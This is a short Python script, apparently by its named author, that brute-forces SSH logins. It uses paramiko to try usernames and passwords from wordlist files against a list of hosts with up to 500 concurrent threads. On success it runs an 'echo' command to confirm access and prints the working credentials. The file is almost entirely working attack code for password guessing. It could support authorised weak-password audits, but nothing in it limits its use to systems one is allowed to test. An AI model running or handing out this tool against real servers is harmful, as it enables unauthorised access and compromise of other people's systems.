#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""  
@Project : python
@File : ssh_burte.py
@Author : moresuo
@Time : 2026/6/27 10:11  
@脚本说明 : ssh爆破
"""
import ipaddress

import paramiko
import concurrent.futures
import warnings

warnings.filterwarnings("ignore")

#ssh连接
def ssh_scan(host,port=22,username="root",password=""):
    try:
        ssh_client=paramiko.SSHClient()
        #设置连接策略，自动识别
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        #ssh连接
        ssh_client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=2,
            look_for_keys=False,
            allow_agent=False,
            banner_timeout=30,
            auth_timeout=1,
            compress=True
        )
        #判断是否连接成功
        if ssh_client.get_transport().is_alive():
            stdin,stdout,stderr=ssh_client.exec_command("echo moresuo")
            if "moresuo" in stdout.read().decode("utf-8"):
                print(f"[+] {host}:{port} SSH连接成功，存在弱口令：{username}/{password}")
            ssh_client.close()
    except:
        pass

#线程池工作，读取用户名文件
def scan_ssh_run_file(hosts,username,password,port=22,threads=500):
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for ip in hosts:
            with open(file=username,mode="r",encoding="utf-8") as users:
                for user in users:
                    with open(file=password,mode="r",encoding="utf-8") as passwords:
                        for pwd in passwords:
                            executor.submit(ssh_scan,ip,port,user.strip(),pwd.strip())
#指定用户名
def scan_ssh_run(hosts,username,password,port=22,threads=500):
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for ip in hosts:
            with open(file=password,mode="r",encoding="utf-8") as passwords:
                for pwd in passwords:
                    executor.submit(ssh_scan,ip,port,username,pwd.strip())

